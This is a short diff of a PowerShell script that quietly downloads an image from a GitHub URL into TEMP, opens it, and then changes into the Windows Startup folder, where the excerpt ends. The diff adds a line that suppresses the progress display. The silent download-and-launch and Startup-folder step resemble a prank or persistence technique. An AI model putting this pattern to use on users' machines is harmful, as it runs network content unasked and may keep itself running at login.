@@ -15,12 +15,14 @@ add-type @"
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-
+$ProgressPreference = 'SilentlyContinue' 
 
 Set-Location $env:TEMP
 
 Invoke-WebRequest -URI "https://raw.githubusercontent.com/schokoring/schokocloud/main/gatze.jpg"  -OutFile gatze.jpg 
 Start-Process gatze.jpg
+
+
 
 
 Set-Location "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
